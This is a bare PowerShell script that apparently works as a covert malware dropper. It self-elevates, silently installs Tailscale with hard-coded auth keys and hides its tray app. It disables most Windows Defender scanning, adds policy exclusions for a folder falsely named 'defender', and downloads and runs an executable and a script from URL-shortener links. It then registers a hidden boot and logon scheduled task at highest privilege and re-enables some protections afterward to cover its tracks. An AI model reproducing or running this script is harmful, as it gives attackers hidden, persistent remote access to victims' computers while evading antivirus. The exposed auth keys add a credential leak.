if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Relaunch script as admin
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}


Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" -OutFile "$env:TEMP\tailscale-setup.exe"
Start-Process -FilePath "$env:TEMP\tailscale-setup.exe" -ArgumentList "/quiet" -NoNewWindow -Wait 
$env:Path = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
#Start-Process -FilePath "tailscale.exe" -ArgumentList "up --authkey tskey-auth-kDmVZv8Wr411CNTRL-W38EWMdmKoHAVMvJFC19oHPH2Ra4X1Yvb" -NoNewWindow -Wait


tailscale up --auth-key=tskey-auth-kcKbHhQ2kA21CNTRL-WDsKUos161Wv18XG4Sr71WER2PWAwrcVA --unattended
tailscale up
Get-Service Tailscale | Set-Service -StartupType Automatic
Remove-Item -Path "C:\Program Files\Tailscale\tailscale-ipn.exe" -Force
Rename-Item -Path "C:\Program Files\Tailscale\tailscale-ipn.exe" -NewName "tailscale-ipn.disabled"



# Disable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable behavior monitoring
Set-MpPreference -DisableBehaviorMonitoring $true

# Disable script scanning
Set-MpPreference -DisableScriptScanning $true

# Disable scanning of downloaded files
Set-MpPreference -DisableIOAVProtection $true

# Additional: Disable cloud protection
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -DisableBlockAtFirstSeen $true


# Define exclusions
$exclusions = @(
    "C:\Program Files\defender\",
    "C:\Program Files\defender\Executable\",
    "C:\Program Files\defender\Executable\def.exe"
)

# Registry path for policy-enforced exclusions
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"

# Ensure the key exists
If (-Not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}

# Add exclusions to the registry
foreach ($path in $exclusions) {
    New-ItemProperty -Path $regPath -Name $path -PropertyType String -Value "" -Force | Out-Null
}
gpupdate /force
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
#Downloading the Files
New-Item -Path "C:\Program Files\defender\Executable" -ItemType Directory -Force
Invoke-WebRequest -Uri "https://tinyurl.com/46jswbnp" -OutFile "C:\Program Files\defender\Executable\def.exe"
Invoke-WebRequest -Uri "https://tinyurl.com/mssa33y9" -OutFile "C:\Program Files\defender\Executable\script.ps1"




if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Relaunch script as admin
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# === Adding info ===
$scriptPath = "C:\Program Files\defender\Executable\script.ps1"  
$taskName = "def"

# === AUTO-DETECT CURRENT USER & SID ===
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$username = $user.Name
$userSID = $user.User.Value

# === BUILD TEMP XML FILE WITH REPLACED VALUES ===
$xmlTemplate = @'
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{DATE}</Date>
    <Author>{AUTHOR}</Author>
    <URI>\{TASKNAME}</URI>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
    <SessionStateChangeTrigger>
      <Enabled>true</Enabled>
      <StateChange>ConsoleConnect</StateChange>
    </SessionStateChangeTrigger>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{SID}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>true</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "{SCRIPT}"</Arguments>
    </Exec>
  </Actions>
</Task>
'@

# Replace placeholders
$xmlContent = $xmlTemplate -replace '{AUTHOR}', $username `
                            -replace '{DATE}', (Get-Date).ToString("s") `
                            -replace '{TASKNAME}', $taskName `
                            -replace '{SID}', $userSID `
                            -replace '{SCRIPT}', $scriptPath

# Save to temp file
$tempXml = "$env:TEMP\$taskName.xml"
$xmlContent | Out-File -FilePath $tempXml -Encoding Unicode

# Register the task
schtasks.exe /Create /TN $taskName /XML $tempXml /F

# Cleanup
Remove-Item $tempXml -Force
Start-Process "C:\Program Files\defender\Executable\def.exe" -Verb RunAs
Start-Process "C:\Program Files\defender\systemsecurity.exe" -Verb RunAs
Write-Host "Scheduled task '$taskName' created successfully to run $scriptPath"
Start-ScheduledTask -TaskName "def"
Get-ScheduledTask -TaskName "def" | Get-ScheduledTaskInfo
# Re-enable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $false

# Re-enable downloaded file scanning
Set-MpPreference -DisableIOAVProtection $false
# Additional: Re-enable cloud protection
Set-MpPreference -MAPSReporting 2
Set-MpPreference -SubmitSamplesConsent 1
Start-Process "C:\Program Files\defender\systemsecurity.exe" -Verb RunAs
